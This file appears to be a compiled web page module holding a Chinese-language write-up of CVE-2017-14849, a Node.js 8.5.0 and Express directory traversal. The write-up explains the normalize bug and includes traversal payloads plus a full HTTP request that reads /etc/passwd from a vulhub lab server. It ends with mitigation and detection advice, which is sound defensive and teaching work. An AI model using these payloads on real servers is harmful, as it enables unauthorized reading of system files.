import{_ as i}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as s,o,c as n,a as e,b as a,d as t,e as c}from"./app-bmqVJyiv.js";const r="/DailyNotes/assets/03-BKQwk2M8.png",l="/DailyNotes/assets/01-YYAK6YOS.png",p="/DailyNotes/assets/02-yPMfZ_If.png",h="/DailyNotes/assets/04-gnsiIxPX.png",u={},m=e("h1",{id:"漏洞名称-node-js-目录穿越漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞名称-node-js-目录穿越漏洞","aria-hidden":"true"},"#"),a(" 漏洞名称：Node.js 目录穿越漏洞")],-1),g=e("hr",null,null,-1),x=e("h2",{id:"漏洞介绍",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞介绍","aria-hidden":"true"},"#"),a(" 漏洞介绍")],-1),b={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"},v=c('<p>express这类web框架，通常会提供了静态文件服务器的功能，这些功能依赖于<code>normalize</code>函数。比如，express在判断path是否超出静态目录范围时，就用到了<code>normalize</code>函数，Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致<code>normalize</code>函数返回错误结果导致绕过了检查，造成任意文件读取漏洞。</p><p>当然，<code>normalize</code>的BUG可以影响的绝非仅有express，更有待深入挖掘。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h3><p>任意文件读取</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h3><p>Node.js 8.5.0 + Express 3.19.0-3.21.2 Node.js 8.5.0 + Express 4.11.0-4.15.5</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><blockquote><p>参考链接：https://security.tencent.com/index.php/blog/msg/121</p></blockquote><p>原因是 Node.js 8.5.0 对目录进行<code>normalize</code>操作时出现了逻辑错误，导致向上层跳跃的时候（如<code>../../../../../../etc/passwd</code>），在中间位置增加<code>foo/../</code>（如<code>../../../foo/../../../../etc/passwd</code>），即可使<code>normalize</code>返回<code>/etc/passwd</code>，但实际上正确结果应该是<code>../../../../../../etc/passwd</code>。具体如下：</p><p>Express依赖Send组件，Send组件0.11.0-0.15.6版本pipe()函数中，如图：</p><figure><img src="'+r+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>Send模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径path后，并没有赋值给path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入545行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是Send模块的一个bug，目前已经修复。</p><p>再来看Node.js，Node.js 8.5.0对path.js文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>assert.strictEqual(path.posix.normalize(&#39;bar/foo../..&#39;), &#39;bar&#39;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>新的修改带来了问题，通过单步调试发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码161行），并且在代码135行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码135行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的payload，这个payload配合上面提到的Send模块bug就能够成功的返回一个我们想要的物理路径，最后在Send模块中读取并返回文件。</p><p>该漏洞是建立在文件夹通过express.static 来托管的情况下，因为在这种情况下才会使用normalize函数进行path标准化。</p><p>比如代码这样写：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app.use(express.static(path.join(__dirname, &#39;static&#39;)));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>那么payload应该是</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/../../../a/../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>但代码如果是这样写的话：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app.use(\`\`&#39;/static&#39;\`\`,express.static(path.join(__dirname, &#39;static&#39;)));
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>那么payload应该为：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/static/../../../a/../../../../etc/passwd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境" aria-hidden="true">#</a> 靶机环境</h3><p>vulhub/node/CVE-2017-14849</p><hr><h3 id="利用方式" tabindex="-1"><a class="header-anchor" href="#利用方式" aria-hidden="true">#</a> 利用方式</h3><p>访问<code>http://your-ip:3000/</code>即可查看到一个web页面，其中引用到了文件<code>/static/main.js</code>，说明其存在静态文件服务器。</p><figure><img src="`+l+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>发送如下数据包，即可读取passwd：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /static/../../../a/../../../../etc/passwd HTTP/1.1
Host: your-ip:3000
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+p+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>或者访问其他文件：</p><figure><img src="'+h+'" alt="04" tabindex="0" loading="lazy"><figcaption>04</figcaption></figure><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议" aria-hidden="true">#</a> 威胁防护建议</h2><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议" aria-hidden="true">#</a> 用户处置建议</h3><p>避免使用受影响版本的node.js</p><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议" aria-hidden="true">#</a> 安全产品检测建议</h3><p>检测类似<code>../../../foo/../../../../etc/passwd</code>的目录遍历形式</p><hr><blockquote><p>https://drive.weixin.qq.com/s?k=AD4AGAfCAAw86qs7kb)</p></blockquote>',49);function f(_,w){const d=s("ExternalLinkIcon");return o(),n("div",null,[m,g,x,e("blockquote",null,[e("p",null,[e("a",b,[a("国家信息安全漏洞库 (cnnvd.org.cn)"),t(d)])])]),v])}const N=i(u,[["render",f],["__file","node_CVE-2017-14849.html.vue"]]);export{N as default};
